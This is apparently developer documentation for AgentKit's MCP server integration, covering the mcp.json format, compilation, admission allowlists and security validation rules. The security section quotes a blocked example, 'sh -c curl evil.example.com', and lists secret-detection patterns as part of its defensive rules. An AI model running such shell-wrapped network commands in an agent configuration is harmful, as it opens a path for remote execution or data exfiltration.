# MCP integration

This guide covers how to declare Model Context Protocol (MCP) servers in an agent package, how AgentKit compiles them for the Antigravity runtime, and how to pass security validation.

**Related guides:** [Getting started](01-getting-started.md) · [Agent manifest reference](03-agent-manifest-reference.md) · [System instructions](04-system-instructions.md) · [Skills and subagents](06-skills-and-subagents.md) · [Policies and governance](07-policies-and-governance.md) · [Validation and evals](08-validation-and-evals.md)

## Overview

MCP servers extend your agent with external tools—database connectors, file systems, APIs, and more. AgentKit reads a **Claude/Cursor-compatible** `mcp.json` file, validates it against security rules, and compiles each entry for the Google Antigravity SDK as stdio (`McpStdioServer`) or streamable HTTP (`McpStreamableHttpServer`) objects.

Reference the file from `agent.yaml`:

```yaml
spec:
  mcp:
    file: mcp.json
    admissionPolicy:
      allowedServers:
        - bigquery-metadata
```

The [mcp example](../../examples/mcp/) example wires MCP, admission policy, and policies together.

## mcp.json format

`mcp.json` uses the same top-level shape as Claude Desktop and Cursor MCP configuration:

```json
{
  "mcpServers": {
    "<server-name>": {
      "command": "<executable>",
      "args": ["<arg1>", "<arg2>"],
      "env": {
        "KEY": "value"
      },
      "envFromSecretManager": {
        "SECRET_KEY": "projects/my-project/secrets/my-secret/versions/latest"
      },
      "enabledTools": ["tool_a"],
      "disabledTools": ["tool_b"]
    },
    "<remote-server>": {
      "url": "https://example.com/mcp",
      "headers": {
        "Authorization": "Bearer ${TOKEN}"
      },
      "disabledTools": ["dangerous_tool"]
    }
  }
}
```

| Field                  | Required  | Description                                                    |
| ---------------------- | --------- | -------------------------------------------------------------- |
| `mcpServers`           | Yes       | Map of server name → server config                             |
| `command`              | For stdio | Executable to spawn (e.g. `uvx`, `npx`, `node`)                |
| `url`                  | For HTTP  | Streamable HTTP MCP endpoint                                   |
| `args`                 | No        | Command-line arguments (stdio only)                            |
| `env`                  | No        | Environment variables passed to the server process (stdio)     |
| `headers`              | No        | HTTP headers for remote MCP servers                            |
| `envFromSecretManager` | No        | Secret Manager references (compiled to `envFromSecretManager`) |
| `enabledTools`         | No        | Allowlist of MCP tool names exposed to the agent               |
| `disabledTools`        | No        | Denylist of MCP tool names hidden from the agent               |

Each server entry must declare **exactly one** transport: `command` (stdio) or `url` (HTTP), not both.

Server names become part of tool identifiers at runtime. A tool exposed by the `bigquery-metadata` server is referenced as `mcp.bigquery-metadata.<tool_name>` in policies and subagent tool lists.

### Example: mcp example

From [`examples/mcp/mcp.json`](../../examples/mcp/mcp.json):

```json
{
  "mcpServers": {
    "bigquery-metadata": {
      "command": "uvx",
      "args": ["company-bigquery-mcp@1.0.0"],
      "env": {
        "GOOGLE_CLOUD_PROJECT": "my-data-project"
      }
    }
  }
}
```

This example uses `uvx` with a **version-pinned** package (`@1.0.0`), which satisfies the npx/uvx pinning rules described below.

## Compiling MCP servers

When you run `antigravity-agentkit compile`, each MCP server is compiled to a runtime dictionary with a `transport` field:

```json
{
  "name": "bigquery-metadata",
  "transport": "stdio",
  "command": "uvx",
  "args": ["company-bigquery-mcp@1.0.0"],
  "env": {
    "GOOGLE_CLOUD_PROJECT": "my-data-project"
  }
}
```

HTTP servers compile with `"transport": "http"` and a `url` field instead of `command`/`args`.

If the `google-antigravity` SDK is installed (`uv sync --extra antigravity`), compilation produces native `McpStdioServer` or `McpStreamableHttpServer` objects. Without the SDK, AgentKit still emits the same dictionary shape.

Tool names in policies and subagents use the `mcp.<server-name>.<tool>` convention—for example, `mcp.bigquery-metadata.list_datasets`.

## admissionPolicy in agent.yaml

Production profiles enforce an **admission allowlist**: every server declared in `mcp.json` must appear in `spec.mcp.admissionPolicy.allowedServers`.

```yaml
spec:
  mcp:
    file: mcp.json
    admissionPolicy:
      allowedServers:
        - bigquery-metadata
```

If `mcp.json` defines a server that is not on the allowlist, validation reports **AGK-MCP-005** under production profiles (`dev-restricted` and all `prod-*` profiles). This prevents undeclared MCP servers from reaching a locked-down deployment.

Admission policy is checked only when the validation profile is not `dev-open`. See [Policies and governance](07-policies-and-governance.md) for profile details.

## Security rules

AgentKit enforces MCP security during `validate --level security` (and higher). Rules are implemented in `mcp.py` and apply to every server in `mcpServers`.

### No shell `-c` execution

Commands that invoke a shell with `-c` are rejected. This blocks patterns like:

```json
{
  "command": "sh",
  "args": ["-c", "curl evil.example.com"]
}
```

`bash`, `sh`, and `zsh` with `-c` are all blocked. Embedded `sh -c` or `bash -c` in the full command string are also detected.

### No inline secrets

Environment values that look like secrets are rejected. Detection covers:

- Keys matching `api_key`, `secret`, `token`, `password`, `credential`, or `private_key` (unless the value is a `${VAR}` placeholder)
- Values matching known patterns: OpenAI `sk_live_*` / `sk_test_*`, AWS `AKIA*`, PEM private keys, GitHub `ghp_*`, GitLab `glpat-*`

**Safe pattern** — reference secrets by placeholder:

```json
"env": {
  "API_KEY": "${SECRET_API_KEY}"
}
```

Or use `envFromSecretManager` for Google Cloud Secret Manager paths.

### Pin npx packages

When `command` is `npx` and `-y` appears in `args`, at least one package argument must include a **semver pin** (e.g. `some-mcp-server@1.2.3`). Unpinned `npx -y some-mcp-server` fails validation.

The same pinning expectation applies to `uvx` and similar launchers when they pass versioned package coordinates in `args`.

### Production-only restrictions

When the validation profile is not `dev-open` (`production=True` internally), `curl` and `wget` as MCP commands are rejected.

Under `dev-open`, MCP security issues are reported as **warnings** (AGK-MCP-003). Under stricter profiles they are **errors**.

## Validating MCP configuration

Run security validation on the full agent directory:

```bash
uv run antigravity-agentkit validate examples/mcp --level security
```

For production governance checks (admission policy, stricter MCP errors):

```bash
uv run antigravity-agentkit validate examples/mcp \
  --level security \
  --profile prod-readonly
```

### MCP diagnostic codes

| Code        | Level      | Meaning                                                   |
| ----------- | ---------- | --------------------------------------------------------- |
| AGK-MCP-001 | ERROR      | Invalid JSON in `mcp.json`                                |
| AGK-MCP-002 | ERROR      | MCP config fails schema validation                        |
| AGK-MCP-003 | WARN/ERROR | MCP security rule violation (severity depends on profile) |
| AGK-MCP-004 | ERROR      | MCP security assertion failed in production               |
| AGK-MCP-005 | ERROR      | MCP server not listed in `admissionPolicy.allowedServers` |

See [Validation and evals](08-validation-and-evals.md) for the full validation level ladder and CI examples.

## Checklist

Before committing `mcp.json`:

1. Use a direct executable (`uvx`, `npx`, `node`)—never `sh -c` or `bash -c`.
2. Store secrets in `${VAR}` placeholders or `envFromSecretManager`, not inline values.
3. Pin package versions in `args` (e.g. `pkg@1.2.3`).
4. List every server name in `admissionPolicy.allowedServers` for production profiles.
5. Reference MCP tools in `policies.yaml` with the `mcp.<server>.<tool>` prefix.
6. Run `antigravity-agentkit validate --level security` locally before opening a PR.
